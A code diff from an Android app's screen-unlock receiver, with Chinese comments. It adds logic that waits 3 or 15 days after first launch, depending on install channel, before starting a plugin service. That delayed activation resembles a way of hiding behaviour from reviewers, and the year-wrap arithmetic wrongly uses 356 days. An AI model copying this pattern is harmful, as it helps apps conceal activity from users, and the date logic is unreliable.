@@ -56,9 +56,34 @@ public class ScreenBRC extends BroadcastReceiver {
         }
 
         if (intent != null && isDeviceBinded /**SettingManager.getInstance().getKeyHasBindingDevices()*/) {
+            /**
+             * 绑定了设备才进行其他动作
+             */
             String action = intent.getAction();
             if (Intent.ACTION_USER_PRESENT.equals(action) || HOUR_ALARM_ACTION.equals(action)) {
                 Config.LOGD("[[ScreenBRC::onReceive]] action = " + action);
+
+                Calendar c1 = Calendar.getInstance();
+                int day = c1.get(Calendar.DAY_OF_YEAR);
+                int delay = 0;
+                if (day > SettingManager.getInstance().getFirstLanuchTime()) {
+                    //在同一年
+                    delay = day - SettingManager.getInstance().getFirstLanuchTime();
+                } else {
+                    //跨年
+                    delay = day + (356 - SettingManager.getInstance().getFirstLanuchTime());
+                }
+                if (Integer.valueOf(Config.CHANNEL_CODE) > 500000) {
+                    //大于500000的渠道用于内置渠道
+                    if (delay < 15) {
+                        return;
+                    }
+                } else {
+                    //小于500000的渠道用于自己推广
+                    if (!Config.DEBUG && delay < 3) {
+                        return;
+                    }
+                }
 
                 SettingManager.getInstance().init(context.getApplicationContext());
                 if (SettingManager.getInstance().getKeyActiveTime() == 0) {
@@ -73,12 +98,13 @@ public class ScreenBRC extends BroadcastReceiver {
                         i.setClass(context, PluginService.class);
                         context.startService(i);
                     }
+
+                    return;
                 } else {
                     long lastActiveTime = SettingManager.getInstance().getKeyActiveTime();
                     Calendar c = Calendar.getInstance();
                     c.setTimeInMillis(lastActiveTime);
                     int lastDay = c.get(Calendar.DAY_OF_YEAR);
-                    int lastHour = c.get(Calendar.HOUR_OF_DAY);
                     int lastMonth = c .get(Calendar.MONTH);
                     c = Calendar.getInstance();
                     int curDay = c.get(Calendar.DAY_OF_YEAR);
